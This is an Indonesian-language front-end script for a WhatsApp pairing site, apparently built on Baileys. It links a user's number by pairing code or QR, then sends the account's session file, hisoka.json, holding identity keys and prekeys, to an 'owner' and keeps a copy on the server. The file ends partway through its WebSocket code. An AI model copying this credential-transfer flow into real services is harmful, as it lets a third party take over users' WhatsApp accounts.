/* SessionBot — app.js
   Logika frontend: validasi nomor realtime (server), pairing code / QR,
   WebSocket status, countdown wall-clock, pipeline, terminal, pengiriman.
   TIDAK PERNAH menampilkan isi package.json. */
(function () {
  'use strict';

  var $ = function (id) { return document.getElementById(id); };
  var $$ = function (sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); };

  var STATE_KEY = 'sessionbot-state-v1';
  var THEME_KEY = 'sessionbot-theme-v1';
  var VISITOR_KEY = 'sessionbot-visitor-v1';
  var RING_C = 339.29; // 2 * PI * 54

  /* ---------------- State ---------------- */
  var state = {
    phone: '',
    phoneValid: false,
    region: null,
    method: null,          // 'pairing' | 'qr'
    codeMode: 'random',    // 'custom' | 'random'
    customCode: '',
    code: '',
    qrDataUrl: '',
    status: 'idle',
    expiresAt: 0,
    totalSeconds: 180,
    botNumber: '',
    delivery: null,
    deliveryError: '',
    session: null,
    sessionFile: '',
    successOverlayShown: false
  };

  var validateTimer = null;
  var validateAbort = null;
  var countdownTimer = null;
  var ws = null;
  var wsRetryMs = 3000;
  var lastStatusLogged = '';
  var operatorsCache = null;

  function saveState() {
    try {
      localStorage.setItem(STATE_KEY, JSON.stringify({
        phone: state.phone,
        method: state.method,
        codeMode: state.codeMode,
        customCode: state.customCode,
        code: state.code,
        qrDataUrl: state.qrDataUrl,
        expiresAt: state.expiresAt,
        totalSeconds: state.totalSeconds,
        status: state.status,
        botNumber: state.botNumber
      }));
    } catch (e) { /* abaikan */ }
  }

  function loadState() {
    try {
      var raw = localStorage.getItem(STATE_KEY);
      return raw ? JSON.parse(raw) : null;
    } catch (e) { return null; }
  }

  function clearSavedCode() {
    var s = loadState() || {};
    s.code = ''; s.qrDataUrl = ''; s.expiresAt = 0; s.status = 'idle';
    try { localStorage.setItem(STATE_KEY, JSON.stringify(s)); } catch (e) { /* abaikan */ }
  }

  /* ---------------- Util ---------------- */
  function fmtBytes(n) {
    if (n == null || isNaN(n)) return '—';
    if (n < 1024) return n + ' B';
    if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
    return (n / (1024 * 1024)).toFixed(2) + ' MB';
  }

  function wibNow() {
    return new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });
  }

  function normalizePhone(raw) {
    var s = String(raw || '').replace(/[\s\-().]/g, '');
    if (!s) return '';
    if (s.charAt(0) === '+') return s.slice(1).replace(/\D/g, '');
    s = s.replace(/\D/g, '');
    if (!s) return '';
    if (s.charAt(0) === '0') return '62' + s.slice(1);
    if (s.charAt(0) === '8') return '62' + s;
    return s;
  }

  function formatCode8(code8) {
    var c = String(code8 || '').replace(/[^A-Z0-9]/gi, '').toUpperCase().padEnd(8, '0').slice(0, 8);
    return c.slice(0, 4) + '-' + c.slice(4);
  }

  /* ---------------- Tema ---------------- */
  var themeModes = ['dark', 'light', 'system'];
  var themeLabels = { dark: ['🌙', 'Malam'], light: ['☀️', 'Siang'], system: ['🌓', 'Sistem'] };

  function currentThemeSetting() {
    try { return localStorage.getItem(THEME_KEY) || 'dark'; } catch (e) { return 'dark'; }
  }

  function applyTheme(setting) {
    var mode = setting;
    if (mode === 'system') {
      mode = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
    }
    document.documentElement.setAttribute('data-theme', mode);
    var btn = $('themeToggle');
    if (btn) {
      var label = themeLabels[setting] || themeLabels.dark;
      var icon = $('themeToggleIcon'); if (icon) icon.textContent = label[0];
      var text = $('themeToggleText'); if (text) text.textContent = label[1];
      btn.setAttribute('aria-label', 'Tema: ' + label[1] + ' (klik untuk ganti)');
    }
  }

  function initTheme() {
    applyTheme(currentThemeSetting());
    var btn = $('themeToggle');
    if (btn) {
      btn.addEventListener('click', function () {
        var cur = currentThemeSetting();
        var next = themeModes[(themeModes.indexOf(cur) + 1) % themeModes.length];
        try { localStorage.setItem(THEME_KEY, next); } catch (e) { /* abaikan */ }
        applyTheme(next);
      });
    }
    try {
      window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', function () {
        if (currentThemeSetting() === 'system') applyTheme('system');
      });
    } catch (e) { /* abaikan */ }
  }

  /* ---------------- Jam WIB realtime ---------------- */
  function tickClock() {
    var el = $('liveClock');
    if (!el) return;
    try {
      var parts = new Intl.DateTimeFormat('id-ID', {
        timeZone: 'Asia/Jakarta', weekday: 'long', day: 'numeric', month: 'long',
        year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
      }).formatToParts(new Date());
      var get = function (t) { var p = parts.find(function (x) { return x.type === t; }); return p ? p.value : ''; };
      el.textContent = get('weekday') + ', ' + get('day') + ' ' + get('month') + ' ' + get('year') +
        ' · ' + get('hour') + ':' + get('minute') + ':' + get('second') + ' WIB';
    } catch (e) {
      el.textContent = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';
    }
  }

  /* ---------------- Presence ---------------- */
  function getVisitorId() {
    try {
      var v = localStorage.getItem(VISITOR_KEY);
      if (!v) {
        v = 'v-' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
        localStorage.setItem(VISITOR_KEY, v);
      }
      return v;
    } catch (e) { return 'v-anon'; }
  }

  function refreshLiveStats() {
    fetch('/api/public/live-stats').then(function (r) { return r.json(); }).then(function (d) {
      if (!d || !d.ok) return;
      var o = $('statOnline'); if (o) o.textContent = d.online;
      var s = $('statStalker'); if (s) s.textContent = d.stalker;
      var v = $('statVisits'); if (v) v.textContent = d.visits;
    }).catch(function () { /* abaikan */ });
  }

  function sendHeartbeat() {
    var paired = ['connected', 'delivering', 'delivered_disconnected'].indexOf(state.status) !== -1;
    fetch('/api/visitor/heartbeat', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ visitorId: getVisitorId(), paired: paired })
    }).then(function (r) { return r.json(); }).then(function (d) {
      if (!d || !d.ok) return;
      var o = $('statOnline'); if (o) o.textContent = d.online;
      var s = $('statStalker'); if (s) s.textContent = d.stalker;
      var v = $('statVisits'); if (v) v.textContent = d.visits;
    }).catch(function () { /* abaikan */ });
  }

  function initPresence() {
    if (!$('statOnline')) return;
    refreshLiveStats();
    sendHeartbeat();
    setInterval(function () { sendHeartbeat(); refreshLiveStats(); }, 30000);
  }

  /* ---------------- Health ---------------- */
  function initHealth() {
    fetch('/api/health').then(function (r) { return r.json(); }).then(function (d) {
      if (!d || !d.ok) return;
      var bv = $('botVersion'); if (bv) bv.textContent = d.botVersion || 'latest';
      var about = $('aboutServer');
      if (about) about.textContent = 'Baileys ' + (d.botVersion || 'latest') + ' · Browser ' + (d.browser || 'Ubuntu + Chrome') + ' · Metode: ' + (d.methods || ['pairing', 'qr']).join(' / ');
      var fl = $('footerServerLink');
      if (fl) fl.textContent = 'Baileys ' + (d.botVersion || 'latest') + ' · V1';
    }).catch(function () { /* abaikan */ });
  }

  /* ---------------- Operator ---------------- */
  function loadOperators() {
    if (operatorsCache) return Promise.resolve(operatorsCache);
    return fetch('/operators.json').then(function (r) { return r.json(); }).then(function (list) {
      operatorsCache = Array.isArray(list) ? list : [];
      return operatorsCache;
    }).catch(function () { operatorsCache = []; return operatorsCache; });
  }

  function findOperatorSlug(carrierName) {
    var norm = String(carrierName || '').toLowerCase().replace(/[^a-z0-9]/g, '');
    if (!norm || !operatorsCache) return null;
    var hit = operatorsCache.find(function (op) {
      var on = String(op.name || '').toLowerCase().replace(/[^a-z0-9]/g, '');
      var os = String(op.slug || '').toLowerCase().replace(/[^a-z0-9]/g, '');
      return on === norm || os === norm;
    });
    return hit ? hit.slug : null;
  }

  /* ---------------- Terminal ---------------- */
  function logLine(msg) {
    var pre = $('terminalLog');
    if (!pre) return;
    var line = '[' + wibNow() + '] ' + msg;
    if (pre.textContent.indexOf('sessionbot siap') === 0 && pre.textContent.split('\n').length === 1) {
      pre.textContent = line;
    } else {
      pre.textContent += '\n' + line;
    }
    var lines = pre.textContent.split('\n');
    if (lines.length > 80) pre.textContent = lines.slice(-80).join('\n');
    pre.scrollTop = pre.scrollHeight;
  }

  /* ---------------- Validasi nomor (realtime, via server) ---------------- */
  function setPhoneError(msg) {
    var el = $('phoneError');
    if (!el) return;
    if (msg) { el.textContent = msg; el.hidden = false; } else { el.hidden = true; el.textContent = ''; }
  }

  function renderChips() {
    var wrap = $('phoneChips');
    if (!wrap) return;
    var r = state.region;
    if (!state.phoneValid || !r) { wrap.hidden = true; wrap.innerHTML = ''; return; }
    wrap.innerHTML = '';
    var regionChip = document.createElement('span');
    regionChip.className = 'chip';
    regionChip.innerHTML = '';
    var flag = document.createElement('span');
    flag.className = 'chip-flag'; flag.textContent = r.flag || '🌐';
    regionChip.appendChild(flag);
    regionChip.appendChild(document.createTextNode((r.countryName || r.country || '—') + ' ' + (r.callingCode || '')));
    wrap.appendChild(regionChip);

    var carrier = r.carrier || 'unknown';
    var opChip = document.createElement('span');
    opChip.className = 'chip';
    if (carrier === 'unknown') {
      opChip.classList.add('muted');
      opChip.textContent = 'Operator tidak dikenal';
    } else {
      var slug = findOperatorSlug(carrier);
      if (slug) {
        var img = document.createElement('img');
        img.src = '/operators/' + slug + '.svg';
        img.alt = 'Logo ' + carrier;
        img.loading = 'lazy';
        opChip.appendChild(img);
      }
      opChip.appendChild(document.createTextNode(carrier));
    }
    wrap.appendChild(opChip);
    wrap.hidden = false;
  }

  function showNormalized() {
    var el = $('phoneNormalized');
    if (!el) return;
    if (state.phoneValid && state.phone) {
      el.innerHTML = '';
      el.appendChild(document.createTextNode('Nomor ternormalisasi: '));
      var code = document.createElement('code');
      code.textContent = state.phone;
      el.appendChild(code);
      el.hidden = false;
    } else { el.hidden = true; }
  }

  function setMethodBlockVisible(show) {
    var mb = $('methodBlock');
    if (mb) mb.hidden = !show;
  }

  function validatePhone() {
    var input = $('phoneInput');
    if (!input) return;
    var digits = normalizePhone(input.value);
    state.phone = digits;

    if (validateAbort) { try { validateAbort.abort(); } catch (e) { /* abaikan */ } }
    if (!digits) {
      state.phoneValid = false; state.region = null;
      input.classList.remove('is-valid', 'is-invalid');
      setPhoneError('');
      renderChips(); showNormalized(); setMethodBlockVisible(false);
      updateRequestBtn();
      return;
    }
    if (digits.length < 6) {
      state.phoneValid = false; state.region = null;
      input.classList.remove('is-valid'); input.classList.add('is-invalid');
      setPhoneError('Nomor terlalu pendek. Masukkan nomor WhatsApp yang lengkap.');
      renderChips(); showNormalized(); setMethodBlockVisible(false);
      updateRequestBtn();
      return;
    }

    validateAbort = new AbortController();
    fetch('/api/session/status?phone=' + encodeURIComponent(digits), { signal: validateAbort.signal })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (!d || !d.ok) {
          state.phoneValid = false; state.region = null;
          input.classList.remove('is-valid'); input.classList.add('is-invalid');
          setPhoneError('Tidak bisa mengecek nomor. Periksa koneksimu lalu coba lagi.');
          renderChips(); showNormalized(); setMethodBlockVisible(false);
          updateRequestBtn();
          return;
        }
        var region = d.region || {};
        if (region.valid) {
          state.phoneValid = true; state.region = region;
          input.classList.add('is-valid'); input.classList.remove('is-invalid');
          setPhoneError('');
          loadOperators().then(function () { renderChips(); });
          renderChips();
          showNormalized();
          setMethodBlockVisible(true);
          // Jika server sudah punya status aktif untuk nomor ini, pulihkan tampilannya.
          if (d.status && d.status !== 'idle') applyStatus(d);
        } else {
          state.phoneValid = false; state.region = region;
          input.classList.remove('is-valid'); input.classList.add('is-invalid');
          setPhoneError('Nomor tidak valid. Periksa lagi nomor WhatsApp kamu — pastikan kode negara & nomornya benar.');
          renderChips(); showNormalized(); setMethodBlockVisible(false);
        }
        updateRequestBtn();
        saveState();
      })
      .catch(function (err) {
        if (err && err.name === 'AbortError') return;
        state.phoneValid = false;
        input.classList.remove('is-valid'); input.classList.add('is-invalid');
        setPhoneError('Tidak bisa mengecek nomor. Periksa koneksimu lalu coba lagi.');
        renderChips(); showNormalized(); setMethodBlockVisible(false);
        updateRequestBtn();
      });
  }

  function initPhoneInput() {
    var input = $('phoneInput');
    if (!input) return;
    input.addEventListener('input', function () {
      if (validateTimer) clearTimeout(validateTimer);
      validateTimer = setTimeout(validatePhone, 300);
    });
    input.addEventListener('paste', function () {
      if (validateTimer) clearTimeout(validateTimer);
      validateTimer = setTimeout(validatePhone, 300);
    });
  }

  /* ---------------- Metode & kode custom ---------------- */
  function selectMethod(method) {
    state.method = method;
    $$('.method-card').forEach(function (card) {
      var on = card.getAttribute('data-method') === method;
      card.classList.toggle('selected', on);
      card.setAttribute('aria-pressed', on ? 'true' : 'false');
    });
    var po = $('pairingOptions'); if (po) po.hidden = method !== 'pairing';
    var qo = $('qrOptions'); if (qo) qo.hidden = method !== 'qr';
    updateRequestBtn();
    saveState();
  }

  function updateRequestBtn() {
    var btn = $('requestBtn');
    if (!btn) return;
    btn.disabled = !(state.phoneValid && state.method);
    btn.textContent = state.method === 'qr' ? 'Minta QR' : 'Minta Kode';
  }

  function refreshCustomPreview() {
    var input = $('customCodeInput');
    var prev = $('customPreview');
    if (!input || !prev) return;
    var v = String(input.value || '').toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 8);
    if (input.value !== v) input.value = v;
    state.customCode = v;
    prev.textContent = formatCode8(v);
    saveState();
  }

  function initMethodUI() {
    $$('.method-card').forEach(function (card) {
      card.addEventListener('click', function () { selectMethod(card.getAttribute('data-method')); });
    });
    $$('input[name="codeMode"]').forEach(function (radio) {
      radio.addEventListener('change', function () {
        state.codeMode = radio.value;
        var wrap = $('customCodeWrap');
        if (wrap) wrap.hidden = radio.value !== 'custom';
        saveState();
      });
    });
    var ci = $('customCodeInput');
    if (ci) ci.addEventListener('input', refreshCustomPreview);
    var btn = $('requestBtn');
    if (btn) btn.addEventListener('click', requestPairing);
  }

  /* ---------------- Overlay ---------------- */
  function showOverlay(mode) {
    var ov = $('overlay');
    if (!ov) return;
    ov.hidden = false;
    var c = $('overlayConnecting'); if (c) c.hidden = mode !== 'connecting';
    var s = $('overlaySuccess'); if (s) s.hidden = mode !== 'success';
    document.body.style.overflow = 'hidden';
  }

  function hideOverlay() {
    var ov = $('overlay');
    if (ov) ov.hidden = true;
    document.body.style.overflow = '';
  }

  function showSuccessOverlay() {
    if (state.successOverlayShown) return;
    state.successOverlayShown = true;
    showOverlay('success');
  }

  /* ---------------- Countdown ring ---------------- */
  function updateCountdown() {
    var remaining = 0;
    if (state.expiresAt > 0) remaining = Math.max(0, Math.ceil((state.expiresAt - Date.now()) / 1000));
    var total = state.totalSeconds || 180;
    var frac = total > 0 ? remaining / total : 0;
    var mm = Math.floor(remaining / 60);
    var ss = remaining % 60;
    var text = mm + ':' + String(ss).padStart(2, '0');
    var rt = $('ringTime'); if (rt) rt.textContent = text;
    var rf = $('ringFg'); if (rf) rf.style.strokeDashoffset = String(RING_C * (1 - frac));
    var rtq = $('ringTimeQr'); if (rtq) rtq.textContent = text;
    var rfq = $('ringFgQr'); if (rfq) rfq.style.strokeDashoffset = String(RING_C * (1 - frac));

    if (state.expiresAt > 0 && remaining <= 0 &&
        (state.status === 'awaiting_code' || state.status === 'awaiting_qr')) {
      expireCode();
    }
  }

  function startCountdown() {
    if (countdownTimer) clearInterval(countdownTimer);
    countdownTimer = setInterval(updateCountdown, 250);
    updateCountdown();
  }

  function expireCode() {
    state.status = 'expired';
    clearSavedCode();
    hideCodeAreas();
    showFinalNote('Kode kedaluwarsa. Minta kode baru untuk melanjutkan.', true);
    logLine('Kode kedaluwarsa — minta kode baru.');
    updateRequestBtn();
    renderPipeline();
  }

  /* ---------------- Tampilan kode / QR ---------------- */
  function hideCodeAreas() {
    var ca = $('codeArea'); if (ca) ca.hidden = true;
    var qa = $('qrArea'); if (qa) qa.hidden = true;
  }

  function renderCodeBoxes() {
    var wrap = $('codeBoxes');
    if (!wrap) return;
    var raw = String(state.code || '').replace(/[^A-Z0-9]/gi, '').toUpperCase();
    wrap.innerHTML = '';
    for (var i = 0; i < 8; i++) {
      var box = document.createElement('span');
      box.className = 'code-box';
      box.textContent = raw.charAt(i) || '·';
      wrap.appendChild(box);
      if (i === 3) {
        var dash = document.createElement('span');
        dash.className = 'code-dash';
        dash.textContent = '–';
        wrap.appendChild(dash);
      }
    }
    var plain = $('codePlain');
    if (plain) plain.textContent = raw ? formatCode8(raw) : '—';
  }

  function showCodeArea() {
    var rb = $('resultBlock'); if (rb) rb.hidden = false;
    var rt = $('resultTitle'); if (rt) rt.textContent = 'Kode Pairing Kamu';
    hideCodeAreas();
    var ca = $('codeArea'); if (ca) ca.hidden = false;
    renderCodeBoxes();
    startCountdown();
    var rb2 = $('resultBlock');
    if (rb2) rb2.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }

  function showQrArea() {
    var rb = $('resultBlock'); if (rb) rb.hidden = false;
    var rt = $('resultTitle'); if (rt) rt.textContent = 'QR Code WhatsApp';
    hideCodeAreas();
    var qa = $('qrArea'); if (qa) qa.hidden = false;
    var img = $('qrImg');
    if (img && state.qrDataUrl) img.src = state.qrDataUrl;
    startCountdown();
    var rb2 = $('resultBlock');
    if (rb2) rb2.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }

  /* ---------------- Pipeline / sesi / pengiriman ---------------- */
  var PIPE_LABELS = {
    1: { idle: 'Menunggu nomor…', done: 'Nomor valid' },
    2: { idle: 'Pairing Code / QR Code', done: 'Metode dipilih' },
    3: { idle: 'Menunggu kode…', active: 'Kode / QR aktif — segera masukkan', done: 'Kode / QR diterima' },
    4: { idle: 'Menunggu bot terhubung…', active: 'Menghubungkan…', done: 'Bot terhubung ✓' },
    5: { idle: 'File hisoka.json ke owner', active: 'Mengirim sesi ke owner…', done: 'Sesi terkirim ke owner ✓', failed: 'Pengiriman gagal — coba kirim ulang' }
  };

  function setPipe(step, cls, label) {
    var li = document.querySelector('.pipeline li[data-pipe="' + step + '"]');
    if (!li) return;
    li.classList.remove('done', 'active');
    if (cls) li.classList.add(cls);
    var dot = li.querySelector('.pipe-dot');
    if (dot) dot.textContent = cls === 'done' ? '✓' : String(step);
    var span = li.querySelector('.pipe-body span');
    if (span && label) span.textContent = label;
  }

  function renderPipeline() {
    var s = state.status;
    var connectedish = ['connected', 'delivering', 'delivered_disconnected', 'delivery_failed'].indexOf(s) !== -1;
    var awaiting = ['awaiting_code', 'awaiting_qr'].indexOf(s) !== -1;
    var requesting = s === 'connecting';

    setPipe(1, state.phoneValid ? 'done' : '', state.phoneValid ? PIPE_LABELS[1].done : PIPE_LABELS[1].idle);
    setPipe(2, state.method && s !== 'idle' ? 'done' : '', state.method ? PIPE_LABELS[2].done : PIPE_LABELS[2].idle);
    setPipe(3, connectedish ? 'done' : (awaiting || requesting ? 'active' : ''),
      connectedish ? PIPE_LABELS[3].done : (awaiting ? PIPE_LABELS[3].active : (requesting ? 'Meminta kode…' : PIPE_LABELS[3].idle)));
    setPipe(4, connectedish ? 'done' : (requesting || awaiting ? 'active' : ''),
      connectedish ? PIPE_LABELS[4].done : (requesting ? PIPE_LABELS[4].active : PIPE_LABELS[4].idle));
    if (s === 'delivered_disconnected') setPipe(5, 'done', PIPE_LABELS[5].done);
    else if (s === 'delivery_failed') setPipe(5, 'active', PIPE_LABELS[5].failed);
    else if (s === 'delivering') setPipe(5, 'active', PIPE_LABELS[5].active);
    else setPipe(5, '', PIPE_LABELS[5].idle);
  }

  function renderSessionTable() {
    var table = $('sessionTable');
    if (!table) return;
    var s = state.session;
    var show = !!(s && (s.exists || state.status !== 'idle'));
    table.hidden = !show;
    if (!show) return;
    var set = function (id, val) { var el = $(id); if (el) el.textContent = val; };
    set('stBotNumber', state.botNumber || '—');
    set('stFile', state.sessionFile || ('sessions/' + state.phone + '/hisoka.json'));
    set('stSize', fmtBytes(s ? s.sizeBytes : null));
    set('stPreKeys', s && s.preKeys != null ? String(s.preKeys) : '—');
    set('stSessions', s && s.sessions != null ? String(s.sessions) : '—');
    set('stIdentityKeys', s && s.identityKeys != null ? String(s.identityKeys) : '—');
    var reg = $('stRegistered');
    if (reg) reg.innerHTML = s && s.registered ? '<span class="pill-ok">Ya</span>' : '<span class="pill-bad">Belum</span>';
    set('stMe', s && s.me ? String(s.me) : '—');
  }

  function renderDelivery() {
    var block = $('deliveryBlock');
    if (!block) return;
    var s = state.status;
    var show = ['connected', 'delivering', 'delivered_disconnected', 'delivery_failed'].indexOf(s) !== -1;
    block.hidden = !show;
    if (!show) return;

    var mark = function (key, cls) {
      var step = document.querySelector('.delivery-step[data-delivery="' + key + '"]');
      if (!step) return;
      step.classList.remove('done', 'active', 'failed');
      if (cls) step.classList.add(cls);
      var icon = step.querySelector('.ds-icon');
      if (icon) icon.textContent = cls === 'done' ? '✅' : (cls === 'failed' ? '❌' : (cls === 'active' ? '⏳' : icon.textContent));
    };

    var sess = state.session || {};
    var maximal = !!(sess.exists && sess.registered && (sess.sizeBytes || 0) > 0);
    if (state.delivery) {
      mark('wait', 'done'); mark('check', 'done'); mark('sent', 'done');
    } else if (s === 'delivering') {
      mark('wait', 'done'); mark('check', 'done'); mark('sent', 'active');
    } else if (s === 'delivery_failed') {
      mark('wait', maximal ? 'done' : 'active'); mark('check', 'failed'); mark('sent', 'failed');
    } else {
      mark('wait', maximal ? 'done' : 'active'); mark('check', ''); mark('sent', '');
    }

    var sentText = $('deliverySentText');
    if (sentText) {
      if (state.delivery) {
        sentText.textContent = 'Terkirim ' + (state.delivery.sentAtWib || '') + ' · ' + fmtBytes(state.delivery.sizeBytes) + ' · ke ' + (state.delivery.owner || 'owner');
      } else if (s === 'delivering') {
        sentText.textContent = 'Sedang mengirim file hisoka.json ke owner…';
      } else {
        sentText.textContent = 'Belum terkirim.';
      }
    }
    var errEl = $('deliveryErrorText');
    if (errEl) {
      if (state.deliveryError) { errEl.textContent = 'Gagal mengirim: ' + state.deliveryError; errEl.hidden = false; }
      else { errEl.hidden = true; errEl.textContent = ''; }
    }
    var sendBtn = $('sendOwnerBtn');
    if (sendBtn) sendBtn.hidden = !(s === 'delivery_failed' || (s === 'connected' && maximal && !state.delivery));
    var logoutBtn = $('logoutBtn');
    if (logoutBtn) logoutBtn.hidden = !(s === 'connected' || s === 'delivering' || s === 'delivered_disconnected' || s === 'delivery_failed');
  }

  function showFinalNote(msg, isError) {
    var el = $('finalNote');
    if (!el) return;
    if (!msg) { el.hidden = true; el.textContent = ''; return; }
    el.textContent = msg;
    el.classList.toggle('error', !!isError);
    el.hidden = false;
  }

  /* ---------------- Terapkan status dari server / WS ---------------- */
  function applyStatus(d) {
    if (!d) return;
    var prev = state.status;
    if (d.status) state.status = d.status;
    if (d.phone) state.phone = d.phone;
    if (d.region) state.region = d.region;
    if (d.method) state.method = d.method;
    if (d.code) state.code = d.code.replace(/[^A-Z0-9]/gi, '').toUpperCase();
    if (d.qrDataUrl) state.qrDataUrl = d.qrDataUrl;
    if (d.botNumber) state.botNumber = d.botNumber;
    if (d.delivery !== undefined) state.delivery = d.delivery;
    if (d.deliveryError !== undefined) state.deliveryError = d.deliveryError || '';
    if (d.session) state.session = d.session;
    if (d.sessionFile) state.sessionFile = d.sessionFile;
    if (d.expiresIn != null && (state.status === 'awaiting_code' || state.status === 'awaiting_qr')) {
      state.expiresAt = Date.now() + d.expiresIn * 1000;
      state.totalSeconds = d.expiresIn;
    }

    // Log perubahan status (sekali per status).
    if (state.status !== prev || state.status !== lastStatusLogged) {
      var labels = {
        connecting: 'Menghubungkan ke WhatsApp…',
        awaiting_code: 'Kode pairing diterima — masukkan di WhatsApp sebelum kedaluwarsa.',
        awaiting_qr: 'QR diterima — pindai dengan WhatsApp.',
        connected: 'Bot terhubung! Menunggu hisoka.json maksimal…',
        delivering: 'hisoka.json maksimal — mengirim ke owner…',
        delivered_disconnected: 'Sesi terkirim ke owner. Sesi web terputus otomatis.',
        delivery_failed: 'Pengiriman ke owner gagal.',
        invalid: 'Sesi tidak valid.',
        expired: 'Kode / QR kedaluwarsa.'
      };
      if (labels[state.status]) logLine(labels[state.status]);
      lastStatusLogged = state.status;
    }

    if (state.status === 'awaiting_code' && state.code) {
      hideOverlay();
      showCodeArea();
    } else if (state.status === 'awaiting_qr' && state.qrDataUrl) {
      hideOverlay();
      showQrArea();
    } else if (state.status === 'connected') {
      hideCodeAreas();
      showSuccessOverlay();
      var rb = $('resultBlock'); if (rb) rb.hidden = false;
    } else if (state.status === 'delivered_disconnected') {
      hideCodeAreas();
      showFinalNote('Sesi terkirim ke owner, sesi web terputus otomatis — file hisoka.json tetap tersimpan di ' + (state.sessionFile || ('sessions/' + state.phone + '/hisoka.json')) + '.', false);
      clearSavedCode();
    } else if (state.status === 'delivery_failed') {
      showFinalNote('Pengiriman sesi ke owner gagal. Coba kirim ulang dengan tombol "Kirim ke Owner".', true);
    } else if (state.status === 'expired') {
      hideCodeAreas();
      showFinalNote('Kode / QR kedaluwarsa. Minta kode baru untuk melanjutkan.', true);
      clearSavedCode();
    } else if (state.status === 'invalid') {
      hideCodeAreas();
      showFinalNote('Sesi tidak valid. Coba lagi dengan nomor yang sama atau nomor baru.', true);
    }

    // Sinkronkan pilihan metode di UI bila datang dari server.
    if (state.method) {
      $$('.method-card').forEach(function (card) {
        var on = card.getAttribute('data-method') === state.method;
        card.classList.toggle('selected', on);
        card.setAttribute('aria-pressed', on ? 'true' : 'false');
      });
      var po = $('pairingOptions'); if (po) po.hidden = state.method !== 'pairing';
      var qo = $('qrOptions'); if (qo) qo.hidden = state.method !== 'qr';
    }

    renderPipeline();
    renderSessionTable();
    renderDelivery();
    updateRequestBtn();
    updateCountdown();
    saveState();
  }

  /* ---------------- Aksi ---------------- */
  function requestPairing() {
    if (!state.phoneValid || !state.method) return;
    var body = { phone: state.phone, method: state.method, codeMode: state.codeMode };
    if (state.codeMode === 'custom' && state.customCode) body.customCode = state.customCode;
    state.successOverlayShown = false;
    state.delivery = null; state.deliveryError = '';
    showFinalNote('');
    showOverlay('connecting');
    var ct = $('overlayConnectingText');
    if (ct) ct.textContent = state.method === 'qr' ? 'Meminta QR ke WhatsApp, tunggu sebentar.' : 'Meminta kode pairing ke WhatsApp, tunggu sebentar.';
    logLine('Meminta ' + (state.method === 'qr' ? 'QR Code' : 'Pairing Code') + ' untuk ' + state.phone + '…');
    state.status = 'connecting';
    renderPipeline();

    fetch('/api/pairing/request', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }).then(function (r) { return r.json(); }).then(function (d) {
      if (!d || !d.ok) {
        hideOverlay();
        var msg = (d && d.error) || 'Gagal meminta kode. Coba lagi.';
        showFinalNote(msg, true);
        var rb = $('resultBlock'); if (rb) rb.hidden = false;
        logLine('Gagal: ' + msg);
        state.status = 'idle';
        renderPipeline();
        return;
      }
      applyStatus(d);
      if (d.status === 'awaiting_code' || d.status === 'awaiting_qr') hideOverlay();
    }).catch(function () {
      hideOverlay();
      showFinalNote('Tidak bisa terhubung ke server. Periksa koneksimu lalu coba lagi.', true);
      var rb = $('resultBlock'); if (rb) rb.hidden = false;
      logLine('Gagal: tidak bisa terhubung ke server.');
      state.status = 'idle';
      renderPipeline();
    });
  }

  function cancelPairing() {
    if (!state.phone) { hideOverlay(); return; }
    fetch('/api/pairing/cancel', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: state.phone })
    }).catch(function () { /* abaikan */ });
    hideOverlay();
    hideCodeAreas();
    state.status = 'idle';
    state.code = ''; state.qrDataUrl = ''; state.expiresAt = 0;
    clearSavedCode();
    logLine('Dibatalkan oleh pengguna.');
    showFinalNote('Dibatalkan. Minta kode baru kapan pun kamu siap.', false);
    var rb = $('resultBlock'); if (rb) rb.hidden = false;
    renderPipeline(); updateRequestBtn();
  }

  function sendToOwner() {
    if (!state.phone) return;
    logLine('Mengirim hisoka.json ke owner secara manual…');
    fetch('/api/session/send-to-owner', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: state.phone, force: true })
    }).then(function (r) { return r.json(); }).then(function (d) {
      if (d) applyStatus(d);
      if (!d || !d.ok) logLine('Gagal mengirim ke owner: ' + ((d && d.error) || 'kesalahan server'));
    }).catch(function () { logLine('Gagal mengirim ke owner: tidak bisa terhubung ke server.'); });
  }

  function logoutSession() {
    if (!state.phone) return;
    fetch('/api/pairing/logout', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone: state.phone })
    }).catch(function () { /* abaikan */ });
    logLine('Sesi diputuskan.');
    resetAll(false);
  }

  function resetAll(clearPhone) {
    state.status = 'idle';
    state.code = ''; state.qrDataUrl = ''; state.expiresAt = 0;
    state.delivery = null; state.deliveryError = ''; state.session = null;
    state.successOverlayShown = false;
    clearSavedCode();
    hideOverlay(); hideCodeAreas();
    var rb = $('resultBlock'); if (rb) rb.hidden = true;
    var db = $('deliveryBlock'); if (db) db.hidden = true;
    var st = $('sessionTable'); if (st) st.hidden = true;
    showFinalNote('');
    if (clearPhone) {
      var input = $('phoneInput');
      if (input) { input.value = ''; input.classList.remove('is-valid', 'is-invalid'); input.focus(); }
      state.phone = ''; state.phoneValid = false; state.region = null;
      setMethodBlockVisible(false);
      renderChips(); showNormalized(); setPhoneError('');
      $$('.method-card').forEach(function (card) { card.classList.remove('selected'); card.setAttribute('aria-pressed', 'false'); });
      state.method = null;
      var po = $('pairingOptions'); if (po) po.hidden = true;
      var qo = $('qrOptions'); if (qo) qo.hidden = true;
    }
    renderPipeline(); updateRequestBtn(); saveState();
  }

  /* ---------------- WebSocket ---------------- */
  function connectWs() {
    try {
      var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
      ws = new WebSocket(proto + '//' + location.host + '/');
      ws.addEventListener('open', function () { wsRetryMs = 3000; });
      ws.addEventListener('message', function (ev) {
        var d = null;
